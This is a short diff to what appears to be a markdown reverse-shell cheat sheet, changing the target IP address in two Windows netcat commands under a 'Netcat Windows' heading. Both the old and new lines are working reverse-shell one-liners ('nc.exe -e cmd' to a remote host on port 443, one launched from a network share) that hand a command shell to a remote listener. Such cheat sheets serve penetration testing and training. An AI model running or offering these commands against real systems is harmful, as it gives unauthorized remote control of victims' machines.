@@ -111,9 +111,9 @@
   # <kbd>Netcat Windows</kbd>
   
   ```cmd
-  nc.exe -e cmd 192.168.1.26 443
+  nc.exe -e cmd 192.168.1.2 443
  
-  \\192.168.1.2\a\nc.exe -e cmd 192.168.1.26 443
+  \\192.168.1.2\a\nc.exe -e cmd 192.168.1.2 443
   ```
   
   ---
